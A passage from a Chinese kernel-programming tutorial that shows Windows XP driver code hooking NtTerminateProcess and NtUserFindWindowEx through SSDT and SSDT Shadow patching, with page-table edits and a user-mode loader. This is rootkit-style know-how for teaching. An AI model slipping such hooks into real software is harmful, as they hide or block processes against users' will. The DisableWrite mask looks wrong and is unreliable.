class="built_in">strcmp</span>(ImageFileName, <span class="string">&quot;notepad.exe&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//如果是当前进程</span></span><br><span class="line">		<span class="keyword">if</span> (hProcess == (HANDLE)<span class="number">0xFFFFFFFF</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// 通过关闭按钮关闭</span></span><br><span class="line">			<span class="keyword">return</span> ((NTTERMINATEPRO)uOldNtTerminateProcess)(hProcess, uExitCode);			</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// 通过任务管理器关闭</span></span><br><span class="line">			DbgPrint(<span class="string">&quot;Terminate denied. %s: NtTerminateProcess(%x, %x)\n&quot;</span>, ImageFileName, hProcess, uExitCode);</span><br><span class="line">			<span class="keyword">return</span> STATUS_ACCESS_DENIED;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	DbgPrint(<span class="string">&quot;hProcess:%x,uExitCode:%x\n&quot;</span>, hProcess, uExitCode);</span><br><span class="line">	<span class="keyword">return</span> ((NTTERMINATEPRO)uOldNtTerminateProcess)(hProcess, uExitCode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过任务管理器关闭记事本：</p>
<p><img data-src="https://s2.loli.net/2022/03/09/EaisujhdoKfwUby.png" alt="23.png"></p>
<p>通过关闭记事本的按钮：</p>
<p><img data-src="https://s2.loli.net/2022/03/09/IOUesp3JH9SLEZf.png" alt="22.png"></p>
<p>通过PCHunter查看：</p>
<p><img data-src="https://s2.loli.net/2022/03/09/cb7IaZH8OisRgvL.png" alt="24.png"></p>
<h3 id="3-4-SSDT-Shadow-HOOK-的-FindWindowA-监视器"><a href="#3-4-SSDT-Shadow-HOOK-的-FindWindowA-监视器" class="headerlink" title="3.4 SSDT Shadow HOOK 的 FindWindowA 监视器"></a>3.4 SSDT Shadow HOOK 的 FindWindowA 监视器</h3><p>先追一下<code>FindWindowA</code>调用路径：</p>
<p>FindWindowA –&gt; user32.dll.FindWindowA –&gt; user32.dll.NtUserFindWindowEx(x, x, x, x, x) –&gt; eax &#x3D; 117Ah</p>
<p>0环驱动代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntstatus.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEVICE_NAME <span class="meta-string">L&quot;\\Device\\HOOKFindWindowADev&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DRIVER_LINK <span class="meta-string">L&quot;\\??\\HOOKFindWindowALnk&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OPHOOK CTL_CODE(FILE_DEVICE_UNKNOWN,0x900,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OPUNHOOK CTL_CODE(FILE_DEVICE_UNKNOWN,0x901,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="comment">// 系统调用号</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTUSERFINDWINDOWEX_SERVICE (0x117A &amp; 0x0FFF)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 系统服务表SST</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSYSTEM_SERVICE_TABLE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	PULONG ServiceTableBase;		<span class="comment">// 函数地址表</span></span><br><span class="line">	PULONG ServiceCounterTableBase;		<span class="comment">//函数被调用的次数</span></span><br><span class="line">	ULONG NumberOfService;			<span class="comment">// 函数个数</span></span><br><span class="line">	PULONG ParamTableBase;			<span class="comment">// 函数参数表（SSPT）</span></span><br><span class="line">&#125; KSYSTEM_SERVICE_TABLE, *PKSYSTEM_SERVICE_TABLE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSERVICE_TABLE_DESCRIPTOR</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	KSYSTEM_SERVICE_TABLE ntoskrnl;		<span class="comment">// 内核ntkrnlpa.exe函数</span></span><br><span class="line">	KSYSTEM_SERVICE_TABLE win32k;		<span class="comment">// win32k.sys函数</span></span><br><span class="line">	KSYSTEM_SERVICE_TABLE unUsed1;</span><br><span class="line">	KSYSTEM_SERVICE_TABLE unUsed2;</span><br><span class="line">&#125; KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ntoskrnl.exe 导出的全局变量</span></span><br><span class="line"><span class="keyword">extern</span> PKSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTable; </span><br><span class="line"><span class="comment">// Only XP 32bit can be used.</span></span><br><span class="line">PKSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTableShadow;</span><br><span class="line"><span class="comment">// 旧的函数地址</span></span><br><span class="line">ULONG uOldNtUserFindWindowEx; </span><br><span class="line"><span class="comment">//系统服务号，从3环传进来</span></span><br><span class="line">ULONG g_dwFun_R0_API = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数声明</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING RegPath)</span></span>;</span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span></span>;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpCreateProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span>;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpCloseProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span>;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpDeviceControlProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span>;</span><br><span class="line"><span class="function">VOID <span class="title">EnableWrite</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">VOID <span class="title">DisableWrite</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">BOOLEAN <span class="title">HookNtUserFindWindowEx</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">BOOLEAN <span class="title">UnHookNtUserFindWindowEx</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">// NTUSERFINDWINDOWSEX，用来指向旧的NtUserFindWindowEx函数</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(*NTUSERFINDWINDOWSEX)</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">			IN ULONG hwndParent, </span></span></span><br><span class="line"><span class="function"><span class="params">			IN ULONG hwndChild, </span></span></span><br><span class="line"><span class="function"><span class="params">			IN ULONG pstrClassName, </span></span></span><br><span class="line"><span class="function"><span class="params">			IN ULONG pstrWindowName, </span></span></span><br><span class="line"><span class="function"><span class="params">			IN ULONG dwTyp)</span></span>;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">MyNtUserFindWindowEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">			IN ULONG hwndParent, </span></span></span><br><span class="line"><span class="function"><span class="params">			IN ULONG hwndChild, </span></span></span><br><span class="line"><span class="function"><span class="params">			IN ULONG pstrClassName, </span></span></span><br><span class="line"><span class="function"><span class="params">			IN ULONG pstrWindowName, </span></span></span><br><span class="line"><span class="function"><span class="params">			IN ULONG dwTyp)</span></span>;</span><br><span class="line"><span class="function">VOID <span class="title">PrintCurrentProcessInfo</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置为可写，WP = 0</span></span><br><span class="line"><span class="function">VOID <span class="title">EnableWrite</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/*	__asm</span></span><br><span class="line"><span class="comment">	&#123;</span></span><br><span class="line"><span class="comment">		cli; // 关闭中断</span></span><br><span class="line"><span class="comment">		mov eax, cr0;</span></span><br><span class="line"><span class="comment">		and eax, not 0x10000; // and eax,0FFFEFFFFh，WP位置0</span></span><br><span class="line"><span class="comment">		mov cr0, eax;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">	ULONG RCR4 = <span class="number">0</span>;</span><br><span class="line">	ULONG HookFunAddr = KeServiceDescriptorTableShadow-&gt;win32k.ServiceTableBase[NTUSERFINDWINDOWEX_SERVICE];</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		cli;</span><br><span class="line">		<span class="comment">//mov eax,cr4，VS2010无法识别该行代码，故以硬编码形式写入</span></span><br><span class="line">		_emit <span class="number">0x0F</span></span><br><span class="line">		_emit <span class="number">0x20</span></span><br><span class="line">		_emit <span class="number">0xE0</span></span><br><span class="line">		mov RCR4,eax;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(RCR4 &amp; <span class="number">0x00000020</span>)	<span class="comment">//说明是2-9-9-12分页</span></span><br><span class="line">	&#123;		</span><br><span class="line">		<span class="comment">//修改PTE_R/W</span></span><br><span class="line">		*(DWORD64*)(<span class="number">0xC0000000</span> + ((HookFunAddr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x007FFFF8</span>)) |= <span class="number">0x02</span>;</span><br><span class="line">		<span class="comment">//修改PDE_R/W</span></span><br><span class="line">		*(DWORD64*)(<span class="number">0xc0600000</span> + ((HookFunAddr &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x3ff8</span>)) |= <span class="number">0x02</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>	<span class="comment">//说明是10-10-12分页</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//修改PTE_R/W</span></span><br><span class="line">		*(ULONG*)(<span class="number">0xC0000000</span> + ((HookFunAddr &gt;&gt; <span class="number">10</span>) &amp; <span class="number">0x003FFFFC</span>)) |= <span class="number">0x02</span>;</span><br><span class="line">		<span class="comment">//修改PDE_R/W</span></span><br><span class="line">		*(ULONG*)(<span class="number">0xC0300000</span> + ((HookFunAddr &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xFFC</span>)) |= <span class="number">0x02</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 设置为不可写，WP = 1</span></span><br><span class="line"><span class="function">VOID <span class="title">DisableWrite</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/*	__asm</span></span><br><span class="line"><span class="comment">	&#123;</span></span><br><span class="line"><span class="comment">		mov eax, cr0;</span></span><br><span class="line"><span class="comment">		or eax, 0x10000; // WP位置1，</span></span><br><span class="line"><span class="comment">		mov cr0, eax;</span></span><br><span class="line"><span class="comment">		sti; // 恢复中断</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">	ULONG RCR4 = <span class="number">0</span>;</span><br><span class="line">	ULONG HookFunAddr = KeServiceDescriptorTableShadow-&gt;win32k.ServiceTableBase[NTUSERFINDWINDOWEX_SERVICE];</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//mov eax,cr4，VS2010无法识别该行代码，故以硬编码形式写入</span></span><br><span class="line">		_emit <span class="number">0x0F</span></span><br><span class="line">		_emit <span class="number">0x20</span></span><br><span class="line">		_emit <span class="number">0xE0</span></span><br><span class="line">		mov RCR4,eax;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(RCR4 &amp; <span class="number">0x00000020</span>)	<span class="comment">//说明是2-9-9-12分页</span></span><br><span class="line">	&#123;		</span><br><span class="line">		<span class="comment">//修改PTE_R/W</span></span><br><span class="line">		*(DWORD64*)(<span class="number">0xC0000000</span> + ((HookFunAddr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x007FFFF8</span>)) &amp;= <span class="number">0xFFFFFFFDF</span>;</span><br><span class="line">		<span class="comment">//修改PDE_R/W</span></span><br><span class="line">		*(DWORD64*)(<span class="number">0xc0600000</span> + ((HookFunAddr &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x3ff8</span>)) &amp;= <span class="number">0xFFFFFFFDF</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>	<span class="comment">//说明是10-10-12分页</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//修改PTE_R/W</span></span><br><span class="line">		*(ULONG*)(<span class="number">0xC0000000</span> + ((HookFunAddr &gt;&gt; <span class="number">10</span>) &amp; <span class="number">0x003FFFFC</span>)) &amp;= <span class="number">0xFFFFFFFDF</span>;</span><br><span class="line">		<span class="comment">//修改PDE_R/W</span></span><br><span class="line">		*(ULONG*)(<span class="number">0xC0300000</span> + ((HookFunAddr &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xFFC</span>)) &amp;= <span class="number">0xFFFFFFFDF</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	__asm sti;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING RegPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ULONG Status;</span><br><span class="line">	ULONG uIndex = <span class="number">0</span>;</span><br><span class="line">	PDEVICE_OBJECT pDeviceObj = <span class="literal">NULL</span>; <span class="comment">// 设备对象指针</span></span><br><span class="line">	UNICODE_STRING DeviceName; <span class="comment">// 设备名，0环用</span></span><br><span class="line">	UNICODE_STRING SymbolicLinkName; <span class="comment">// 符号链接名，3环用</span></span><br><span class="line">	KeServiceDescriptorTableShadow = (PKSERVICE_TABLE_DESCRIPTOR)((ULONG)KeServiceDescriptorTable - <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">	PrintCurrentProcessInfo();</span><br><span class="line">	<span class="comment">// 创建设备名称</span></span><br><span class="line">	RtlInitUnicodeString(&amp;DeviceName,DEVICE_NAME);</span><br><span class="line">	<span class="comment">// 创建设备</span></span><br><span class="line">	Status = IoCreateDevice(pDriver,<span class="number">0</span>,&amp;DeviceName,FILE_DEVICE_UNKNOWN,FILE_DEVICE_SECURE_OPEN,FALSE,&amp;pDeviceObj);</span><br><span class="line">	<span class="keyword">if</span> (Status != STATUS_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line">		IoDeleteDevice(pDeviceObj);</span><br><span class="line">		DbgPrint(<span class="string">&quot;创建设备失败.\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> Status;</span><br><span class="line">	&#125;</span><br><span class="line">	DbgPrint(<span class="string">&quot;创建设备成功.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 设置交互数据的方式</span></span><br><span class="line">	pDeviceObj-&gt;Flags |= DO_BUFFERED_IO;</span><br><span class="line">	<span class="comment">// 创建符号链接</span></span><br><span class="line">	RtlInitUnicodeString(&amp;SymbolicLinkName, DRIVER_LINK);</span><br><span class="line">	IoCreateSymbolicLink(&amp;SymbolicLinkName, &amp;DeviceName);</span><br><span class="line">	<span class="comment">// 设置分发函数</span></span><br><span class="line">	pDriver-&gt;MajorFunction[IRP_MJ_CREATE] = IrpCreateProc;</span><br><span class="line">	pDriver-&gt;MajorFunction[IRP_MJ_CLOSE] = IrpCloseProc;</span><br><span class="line">	pDriver-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = IrpDeviceControlProc;</span><br><span class="line">	<span class="comment">// 设置卸载函数</span></span><br><span class="line">	pDriver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载驱动</span></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	UNICODE_STRING SymbolicLinkName;</span><br><span class="line">	<span class="comment">// 删除符号链接，删除设备</span></span><br><span class="line">	RtlInitUnicodeString(&amp;SymbolicLinkName, DRIVER_LINK);</span><br><span class="line">	IoDeleteSymbolicLink(&amp;SymbolicLinkName);</span><br><span class="line">	IoDeleteDevice(pDriver-&gt;DeviceObject);</span><br><span class="line">	DbgPrint(<span class="string">&quot;驱动卸载成功\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不设置这个函数，则Ring3调用CreateFile会返回1</span></span><br><span class="line"><span class="comment">// IRP_MJ_CREATE 处理函数</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpCreateProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;应用层连接设备.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 返回状态如果不设置，Ring3返回值是失败</span></span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">	pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">	IoCompleteRequest(pIrp, IO_NO_INCREMENT);</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// IRP_MJ_CLOSE 处理函数</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpCloseProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;应用层断开连接设备.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 返回状态如果不设置，Ring3返回值是失败</span></span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">	pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">	IoCompleteRequest(pIrp, IO_NO_INCREMENT);</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// IRP_MJ_DEVICE_CONTROL 处理函数</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpDeviceControlProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// DbgPrint(&quot;IrpDeviceControlProc.\n&quot;);</span></span><br><span class="line">	NTSTATUS status = STATUS_INVALID_DEVICE_REQUEST;</span><br><span class="line">	PIO_STACK_LOCATION pIrpStack;</span><br><span class="line">	ULONG uIoControlCode;</span><br><span class="line">	PVOID pIoBuffer;</span><br><span class="line">	ULONG uInLength;</span><br><span class="line">	ULONG uOutLength;</span><br><span class="line">	ULONG uRead;</span><br><span class="line">	ULONG uWrite;</span><br><span class="line">	BOOLEAN bRet = FALSE;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 设置临时变量的值</span></span><br><span class="line">	uRead = <span class="number">0</span>;</span><br><span class="line">	uWrite = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// 获取IRP数据</span></span><br><span class="line">	pIrpStack = IoGetCurrentIrpStackLocation(pIrp);</span><br><span class="line">	<span class="comment">// 获取控制码</span></span><br><span class="line">	uIoControlCode = pIrpStack-&gt;Parameters.DeviceIoControl.IoControlCode;</span><br><span class="line">	<span class="comment">// 获取缓冲区地址（输入输出是同一个）</span></span><br><span class="line">	pIoBuffer = pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">	<span class="comment">// Ring3 发送数据的长度</span></span><br><span class="line">	uInLength = pIrpStack-&gt;Parameters.DeviceIoControl.InputBufferLength;</span><br><span class="line">	<span class="comment">// Ring0 发送数据的长度</span></span><br><span class="line">	uOutLength = pIrpStack-&gt;Parameters.DeviceIoControl.OutputBufferLength;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (uIoControlCode)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> OPHOOK:</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// 打印进程镜像名和PID</span></span><br><span class="line">			PrintCurrentProcessInfo();</span><br><span class="line">			<span class="comment">// 读取缓冲区</span></span><br><span class="line">			<span class="built_in">memcpy</span>(&amp;uRead,pIoBuffer,<span class="number">4</span>);</span><br><span class="line">			<span class="comment">//DbgPrint(&quot;Get Service Num is %x\n&quot;,uRead);</span></span><br><span class="line">			<span class="comment">//执行结束进程</span></span><br><span class="line">			bRet = HookNtUserFindWindowEx();</span><br><span class="line">			<span class="keyword">if</span>(bRet == TRUE)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">// 写入缓冲区</span></span><br><span class="line">				uWrite = <span class="number">1</span>;</span><br><span class="line">				<span class="built_in">memcpy</span>(pIoBuffer, &amp;uWrite, <span class="number">4</span>);</span><br><span class="line">			&#125;<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">// 写入缓冲区</span></span><br><span class="line">				uWrite = <span class="number">0</span>;</span><br><span class="line">				<span class="built_in">memcpy</span>(pIoBuffer, &amp;uWrite, <span class="number">4</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="comment">// 设置状态</span></span><br><span class="line">			pIrp-&gt;IoStatus.Information = <span class="number">4</span>;</span><br><span class="line">			status = STATUS_SUCCESS;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">case</span> OPUNHOOK:</span><br><span class="line">		&#123;</span><br><span class="line">			bRet = UnHookNtUserFindWindowEx();</span><br><span class="line">			<span class="comment">// 设置状态</span></span><br><span class="line">			pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">			status = STATUS_SUCCESS;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 返回状态如果不设置，Ring3返回值是失败</span></span><br><span class="line">	pIrp-&gt;IoStatus.Status = status;</span><br><span class="line">	IoCompleteRequest(pIrp, IO_NO_INCREMENT);</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// HOOK NtTerminateProcess</span></span><br><span class="line"><span class="function">BOOLEAN <span class="title">HookNtUserFindWindowEx</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	EnableWrite();</span><br><span class="line">	uOldNtUserFindWindowEx = KeServiceDescriptorTableShadow-&gt;win32k.ServiceTableBase[NTUSERFINDWINDOWEX_SERVICE];</span><br><span class="line">	KeServiceDescriptorTableShadow-&gt;win32k.ServiceTableBase[NTUSERFINDWINDOWEX_SERVICE] = (ULONG)MyNtUserFindWindowEx;</span><br><span class="line">	DisableWrite();</span><br><span class="line">	DbgPrint(<span class="string">&quot;Hooked: %p -&gt; %p\n&quot;</span>, uOldNtUserFindWindowEx, KeServiceDescriptorTableShadow-&gt;win32k.ServiceTableBase[NTUSERFINDWINDOWEX_SERVICE]);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// UnHOOK NtTerminateProcess</span></span><br><span class="line"><span class="function">BOOLEAN <span class="title">UnHookNtUserFindWindowEx</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	EnableWrite();</span><br><span class="line">	KeServiceDescriptorTableShadow-&gt;win32k.ServiceTableBase[NTUSERFINDWINDOWEX_SERVICE] = uOldNtUserFindWindowEx;</span><br><span class="line">	DisableWrite();</span><br><span class="line">	DbgPrint(<span class="string">&quot;UnHooked: %p\n&quot;</span>, KeServiceDescriptorTableShadow-&gt;win32k.ServiceTableBase[NTUSERFINDWINDOWEX_SERVICE]);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 被修改的 NtUserFindWindowEx 函数，简单打印参数</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">MyNtUserFindWindowEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">			IN ULONG hwndParent, </span></span></span><br><span class="line"><span class="function"><span class="params">			IN ULONG hwndChild, </span></span></span><br><span class="line"><span class="function"><span class="params">			IN ULONG pstrClassName, </span></span></span><br><span class="line"><span class="function"><span class="params">			IN ULONG pstrWindowName, </span></span></span><br><span class="line"><span class="function"><span class="params">			IN ULONG dwTyp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;NtUserFindWindowEx(%x, %x, %x, %x, %x)\n&quot;</span>, hwndParent,hwndChild,pstrClassName,pstrWindowName,dwTyp);</span><br><span class="line">	<span class="keyword">return</span> ((NTUSERFINDWINDOWSEX)uOldNtUserFindWindowEx)(hwndParent,hwndChild,pstrClassName,pstrWindowName,dwTyp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印进程镜像名和PID</span></span><br><span class="line"><span class="function">VOID <span class="title">PrintCurrentProcessInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PEPROCESS pEprocess = <span class="literal">NULL</span>;</span><br><span class="line">	PCHAR ImageFileName;</span><br><span class="line">	ULONG pid;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		mov eax, fs:[<span class="number">0x124</span>];</span><br><span class="line">		mov eax, [eax + <span class="number">0x220</span>];</span><br><span class="line">		mov pEprocess, eax;</span><br><span class="line">		mov eax, [eax + <span class="number">0x84</span>];</span><br><span class="line">		mov pid, eax;</span><br><span class="line">	&#125;</span><br><span class="line">	ImageFileName = (PCHAR)pEprocess + <span class="number">0x174</span>;</span><br><span class="line">	DbgPrint(<span class="string">&quot;pid: %x, ImageFileName:%s\n&quot;</span>,pid, ImageFileName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>3环代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HOOK0316.cpp : Defines the entry point for the console application.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 编写一个简单的驱动，在驱动入口和卸载函数打印一些提示信息</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DRIVER_NAME <span class="meta-string">L&quot;HOOKFindWindowA&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DRIVER_PATH <span class="meta-string">L&quot;HOOKFindWindowA.sys&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DRIVER_LINK <span class="meta-string">L&quot;\\\\.\\HOOKFindWindowALnk&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OPHOOK CTL_CODE(FILE_DEVICE_UNKNOWN,0x900,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OPUNHOOK CTL_CODE(FILE_DEVICE_UNKNOWN,0x901,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">LoadDriver</span><span class="params">(PCWSTR lpszDriverName, PCWSTR lpszDriverPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 获取驱动完整路径</span></span><br><span class="line">	WCHAR szDriverFullPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	GetFullPathNameW(lpszDriverPath,MAX_PATH,szDriverFullPath,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">//printf(&quot;%ws\n&quot;, szDriverFullPath);</span></span><br><span class="line">	<span class="comment">// 打开服务控制管理器</span></span><br><span class="line">	SC_HANDLE hServiceMgr = <span class="literal">NULL</span>; <span class="comment">// SCM管理器句柄	</span></span><br><span class="line">	hServiceMgr = OpenSCManagerW(<span class="literal">NULL</span>,<span class="literal">NULL</span>,SC_MANAGER_ALL_ACCESS);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == hServiceMgr)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;OpenSCManagerW 失败, %d\n&quot;</span>, GetLastError());</span><br><span 